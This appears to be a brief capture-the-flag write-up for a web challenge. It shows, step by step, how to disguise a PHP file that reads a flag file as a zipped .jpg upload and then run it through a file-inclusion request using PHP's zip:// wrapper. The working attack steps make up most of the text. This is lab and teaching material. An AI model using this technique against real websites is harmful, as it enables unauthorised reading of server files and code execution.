# PHP Wrappers

# step 1: 

create file a.php

```php
# a.php
<?php
    echo file_get_contents("flag<name.....>.php"); # it is found similar ....
?>
```

# step 2:

```shell
$ zip payload.zip a.php && mv payload.zip payload.jpg

```

# step 3: upload -> id_image

# step 4: 
```shell
GET /web-serveur/ch43/index.php?page=zip://tmp/upload/<name>.jpg%23a.php
```
link this method: `https://book.hacktricks.xyz/pentesting-web/file-inclusion#zip-and-rar`